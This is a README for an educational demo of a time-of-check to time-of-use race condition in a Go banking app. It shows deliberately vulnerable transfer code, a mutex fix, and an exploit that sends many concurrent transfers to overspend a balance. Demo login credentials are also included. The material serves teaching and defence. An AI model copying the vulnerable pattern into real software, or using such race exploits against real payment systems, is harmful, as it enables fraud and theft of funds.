# TOCTOU Vulnerability

_Time-of-check_ to _time-of-use_ is a security vulnerability involving race conditions.

A program is vulnerable to a TOCTOU race condition if it does the following:
1. Checks some property or validates some data
2. Takes some action based on this information

## The demonstration

This demo showcases a _double spend_ vulnerability.
The system is exploited by several transactions that are executed in parallel.
This results in the ability to spend non-existing funds.

For example, if a user has a balance of 500, two parallel transfers can result in the total transfer of 1000, and the user's balance becoming -500.

### The vulnerable application

The essence of the demo lies in the `handlers/transfer.go` file.

```go
// ...

amount, err := strconv.ParseFloat(amountStr, 64)
if err != nil || amount <= 0 {
    http.Redirect(w, r, "/", http.StatusSeeOther)
    return
}

var senderBalance float64
err = db.QueryRow(`SELECT balance FROM users WHERE id = $1`, senderID).Scan(&senderBalance)
if err != nil {
    http.Redirect(w, r, "/", http.StatusSeeOther)
    return
}

if senderBalance < amount {
    http.Redirect(w, r, "/", http.StatusSeeOther)
    return
}

tx, err := db.Begin()
if err != nil {
    http.Redirect(w, r, "/", http.StatusSeeOther)
    return
}

_, err = tx.Exec(
`UPDATE users SET balance = balance - $1 WHERE id = $2`, amount, senderID)
if err != nil {
    tx.Rollback()
    http.Redirect(w, r, "/", http.StatusSeeOther)
    return
}

_, err = tx.Exec(
`UPDATE users SET balance = balance + $1 WHERE id = $2`, amount, recipientID)
if err != nil {
    tx.Rollback()
    http.Redirect(w, r, "/", http.StatusSeeOther)
    return
}

_, err = tx.Exec(
`INSERT INTO transfers (sender_id, recipient_id, amount, timestamp) VALUES ($1, $2, $3, $4)`,
senderID, recipientID, amount, time.Now(),
)
if err != nil {
    tx.Rollback()
    http.Redirect(w, r, "/", http.StatusSeeOther)
    return
}

err = tx.Commit()
if err != nil {
    tx.Rollback()
    http.Redirect(w, r, "/", http.StatusSeeOther)
return
}
```
Code snippet 1: The core logic for transferring funds.

Transactions have been added in the `fix` branch, ensuring the atomicity of the transfers, and as a surface level mitigation.

The core logic preventing the race condition is the `sync.Mutex` added to `handlers/transfer.go`.
This ensures that only one transfer can be executed at a time, thus preventing double spend.

```go
var mu sync.Mutex

func TransferHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Redirect(w, r, "/", http.StatusSeeOther)
		return
	}
	
	mu.Lock()
	defer mu.Unlock()
	
	// ...
```
Code snippet 2: The utilisation of `sync.Mutex` in `handlers/transfer.go`, preventing the race condition. 

### The exploit

```
$ exploit -h
Usage of ./exploit:
  -amount string
        amount to transfer in each request (default "500")
  -email string
        attacker account email (default "lmihailovic@mail.com")
  -password string
        attacker account password (default "password2")
  -recipient string
        recipient user id (default "3")
  -requests int
        number of concurrent transfer requests (default 100)
  -timeout duration
        HTTP client timeout (default 10s)
  -url string
        base URL of the vulnerable application (default "http://localhost:8080")
```
Code snippet 3: The exploit script and its options.

The race condition is exploited by creating a large number of parallel transfer requests.

```go
func runRace(client *http.Client, cfg config) (int64, int64) {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	ready := make(chan struct{})
	var wg sync.WaitGroup
	var successful atomic.Int64
	var failed atomic.Int64

	for i := 0; i < cfg.requests; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			<-ready

			if err := transfer(ctx, client, cfg); err != nil {
				failed.Add(1)
				return
			}
			successful.Add(1)
		}()
	}

	close(ready)
	wg.Wait()

	return successful.Load(), failed.Load()
}
```
Code snippet 4: Function in `attack/exploit.go` which creates the race condition.

## Running the demo

Make sure you have Docker and Git installed.

Steps:
1. Clone the repository and `cd` into it:
```shell
git clone https://github.com/lmihailovic/toctou-demo/ && cd toctou-demo/
```

3. Switch to the desired branch (`vuln` or `fix`):
```shell
git checkout vuln 
```
```shell
git checkout fix
```

2. Start the database and the application:
```shell
docker compose up --build
```

3. Upon receiving the `Connection successful` and `Server started` messages, visit the application at `http://localhost:8080`.
4. Log into the application to make sure everything works as expected.
5. Start the `exploit.go` script (either as a binary executable or via `go run`)

The script will fail to double spend, and won't be able to make the attacker's balance go into negative numbers.
By checking into the `vuln` branch and running the exploit script, you will be able to double spend and have negative balances.

### Login data

Admin account:
```
email: lobradovic@mail.com
password: password1
```

User accounts:
```
email: lmihailovic@mail.com
password: password2

email: vlazarevic@mail.com
password: password3
```

## Contributors

| Name                                               | Task                                                         | Branch |
|----------------------------------------------------|--------------------------------------------------------------|--------|
| [Luka Obradović](https://github.com/lobradovic)    | Vulnerable application                                       | `vuln` |
| [Vukadin Lazarević](https://github.com/LazarevicV) | Exploit script + containerization + instructions for running | `vuln` |
| [Luka Mihailović](https://github.com/lmihailovic)  | Safe application + documentation                             | `fix`  |
